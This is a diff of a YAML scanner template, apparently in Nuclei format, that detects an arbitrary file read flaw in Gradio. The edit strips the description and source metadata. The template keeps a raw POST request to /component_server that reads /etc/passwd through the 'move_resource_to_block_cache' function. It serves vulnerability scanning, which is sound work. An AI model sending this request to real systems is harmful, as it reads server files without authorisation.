@@ -3,12 +3,8 @@ info:
   name: gradio任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/novng5a5ga7rmxm8'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: novng5a5ga7rmxm8
-    fofa: 'shodan-query: html:"__gradio_mode__"'
 http:
 - raw:
   - 'POST /component_server HTTP/1.1
@@ -21,8 +17,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     {"component_id": "1","data": "/etc/passwd","fn_name": "move_resource_to_block_cache","session_hash": "aaaaaaaaaaa"}
